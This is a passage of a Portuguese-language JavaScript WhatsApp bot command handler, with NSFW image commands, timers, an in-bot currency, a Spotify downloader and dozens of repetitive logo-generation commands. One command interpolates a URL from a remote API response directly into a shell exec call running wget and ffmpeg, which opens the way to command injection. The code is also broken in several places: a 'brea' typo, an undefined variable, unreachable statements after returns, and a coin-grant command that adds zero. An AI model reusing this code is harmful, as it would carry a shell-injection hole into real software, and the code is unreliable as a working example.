enviar('N√£o fique entediado eu estou aquiü•∞')
break
case 'nsfwblowjob':
try {
if (!isNsfw) return enviar ('‚ùå *FALSO* ‚ùå')
res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob`, {method: 'get'})
buffer = await getBuffer(res.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'N√£o fa√ßa ingredientes para o tio comum'})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('‚ùå *ERRO* ‚ùå')
}
break                       
case 'testime':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
setTimeout( () => {
tomioka.sendMessage(from, 'O tempo acabou:v', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
tomioka.sendMessage(from, 'Mais 5 segundos', text) // ur cods
}, 5000) // 1000 = 1s,
setTimeout( () => {
tomioka.sendMessage(from, '10 segundos para ir', text) // ur cods
}, 0) // 1000 = 1s,
break
case 'timer':
if (args[1]=="segundo") {var timer = args[0]+"000"
} else if (args[1]=="minuto") {var timer = args[0]+"0000"
} else if (args[1]=="hora") {var timer = args[0]+"00000"
} else {return enviar ("*escolher:*\nsegundo\nminuto\nhora")}
setTimeout( () => {
enviar("O tempo acabou")
}, timer)
break
case 'delete':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('marque a msg para apagar *seja um administrador!*')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Comando recebido, excluir mensagem :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
tomioka.deleteMessage(from, mentioned)
} else {
mentions(`Perintah di terima, hapus pesan : @${mentioned[0].split('@')[0]}`, mentioned, true)
tomioka.deleteMessage(from, mentioned)
}
brea
case 'nsfwneko':
try {
if (!isNsfw) return enviar ('‚ùå *FALSO* ‚ùå')
res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko`, {method: 'get'})
buffer = await getBuffer(res.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'ni anjim'})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('‚ùå *ERRO* ‚ùå')
}
break
case 'nsfwtrap':
try {
if (!isNsfw) return enviar ('‚ùå *FALSO* ‚ùå')
res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap`, {method: 'get'})
buffer = await getBuffer(res.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: 'ni Anjim'})
} catch (e) {
console.log(`Error :`, color(e,'red'))
enviar('‚ùå *ERRO* ‚ùå')
}
break
//DINHEIRO DO BOT

case 'dinhero':          

case 'dinheiro':       

case 'meudinhero':
if (!isUser) return enviar('usuario nao registrado')

const uangkau = checkATMuser(sender)
sayo = `*‚îè‚ä± „Äå ü§ëDINHEIROü§ë „Äç‚ä∞‚îÅ‚îì*\n‚î£‚ä± *Nome* : ${pushname}\n‚î£‚ä± *N√∫mero* : ${sender.split("@")[0]}\n‚î£‚ä± *Dinhero* : ${uangkau}\n‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`
enviar(sayo)
break

case 'dardinhero': 
if (!isOwner) return enviar('s√≥ dono')
const recebidor = args[0].replace('@','')
const quantidade = args[1]
if (quantidade <= 1) return enviar(`Precisa dar no min√≠mo 1 dinheiro`)
if (isNaN(quantidade)) return enviar(`[‚ùó] USE ASSIM\n ${prefix + command} @556181496039 5`)
if (!recebidor) return enviar(`[‚ùó] USE ASSIM\n ${prefix + command} @556181496039 5`)
const add = recebidor + '@s.whatsapp.net'
addKoinUser(add, 0)                                        
enviar(`${quantidade} de dinhero foi adicionado na conta de @${recebidor}`)
break
case 'animsgiss':

anp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzApi}`, {method: 'get'})
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break 
case 'setfoto':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (!isGroupAdmins) return enviar ('s√≥ adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
media = await tomioka.downloadAndSaveMediaMessage(msg)
await tomioka.updateProfilePicture (from, media)
enviar('Alterou com sucesso o √≠cone do Grupo')
break		
case 'tinyurl':
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/tinyurl?url=${body.slice(9)}&apikey=${TobzApi}`)
tinyurl = `${anu.result}`
enviar(tinyurl)

break 
case 'slide':
if (args.length < 1) return enviar ('*Textnya mana gan?*')
teks = `${body.slice(7)}`
atytyd = await getBuffer(`https://api.vhtear.com/slidingtext?text=${teks}&apikey=${VthearApi}`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
tomioka.sendMessage(from, atytyd, video, {quoted: msg})

break  
case 'spotify':
if (args.length == 0) return 
enviar(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
url = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=genbotkey&url=${url}`)
get_result = get_result.result
ini_txt = `Titulo : ${get_result.title}\n`
ini_txt += `Dura√ß√£o : ${get_result.duration}\n`
thumbnail = await getBuffer(get_result.thumbnail)
await tomioka.sendMessage(from, thumbnail, image, {quoted: msg, caption: ini_txt })
get_audio = await getBuffer(get_result.link)
await tomioka.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break 
case 'spotifyy':
if (args.length == 0) return 
enviar(`Exemplo: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
url = args[0]
get_result = await fetchJson(`https://api-gdr2.herokuapp.com/api/spotifyurl?url=${url}`)
get_result = get_result.result
ini_txt = `Titulo : ${get_result.title}\n`
ini_txt += `Dura√ß√£o : ${get_result.duration}\n`
thumbnail = await getBuffer(get_result.image)
await tomioka.sendMessage(from, image, image, {quoted: msg, caption: ini_txt })
get_audio = await getBuffer(get_result.link)
await tomioka.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break
//_LOGOS 
case 'greenhorror':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/greenhorror?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sciencefiction':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/sciencefiction?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'transformer':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/transformer?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'berry':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/berry?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'magmahot':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/magmahot?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dstone':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dstone?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dneonlight':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dneonlight?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'impressiveglitch':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/impressiveglitch?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'harrypotter':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HarryPotter?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'embossed':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/embossed?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'brokenglass':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Brokenglass?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'artpaper':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/artpaper?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dglossy':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dglossy?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'neondevilwings':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/neondevilwings?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dunderwater':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dunderwater?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'bearmascot':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/bearmascot?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'wonderfulgraffiti':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/wonderfulgraffiti?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'futuristicneon':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/futuristicneon?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'snow':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/snow?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'cloud':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/cloud?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'luxurygold':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/luxurygold?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dgradient':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dgradient?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'realisticcloud':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/realisticcloud?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sandsummer':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SandSummer?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sandwriting':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SandWriting?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'sandengraved':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Sandengraved?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'summerysand':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/summerysand?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dglue':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3dglue?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'metaldarkgold':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/MetalDarkGold?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'neonlight':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/NeonLight?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '1917':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/1917Style?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'xmascards3d':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/XmasCards3D?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'blood':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Blood?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'halloweenfire':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HalloweenFire?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'lava':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Lava?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'steeltext':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SteelText?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'captainamerica':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/CaptainAmerica?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'toxic':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Toxic?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'chocolate':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Chocolate?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'matrix':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Matrix?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'horrorblood':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HorrorBlood?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'thunder2':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Thunder2?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ‚ö°`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dbox':  //by ·èïÍ™ñÍ™óÍ™Æ </>

if (!isPremium) return enviar ('s√≥ premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[‚ùó] aguarde..`)
